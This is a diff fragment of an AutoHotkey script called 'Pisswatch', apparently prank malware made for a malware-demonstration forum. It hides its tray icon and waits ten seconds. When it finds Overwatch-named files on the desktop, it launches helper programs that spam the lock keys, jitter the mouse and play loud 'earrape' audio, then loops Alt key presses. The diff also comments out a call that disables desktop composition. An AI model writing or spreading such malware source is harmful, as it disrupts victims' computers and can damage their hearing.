@@ -1,6 +1,8 @@
 #NoTrayIcon
+; The heart of Pisswatch, this controls almost everything ever!
+;(C) 2016 OMFGThor / Goldstar, made exclusively for Danooct1 forums
 Start:
-CheckForFile:
+Sleep, 10000
 IfExist, %A_Desktop%\*overwatch*.*
 Goto, Payload
 IfNotExist, %A_Desktop%\*overwatch*.*
@@ -10,7 +12,7 @@ Run, checkfile.exe
 Run, spamNumCapsScrl.exe
 Run, jittermouse.exe
 Run, earrape.exe
-DllCall("dwmapi\DwmEnableComposition", "uint", 0)
+;DllCall("dwmapi\DwmEnableComposition", "uint", 0)
 Loop
 {
 Send {Alt down}
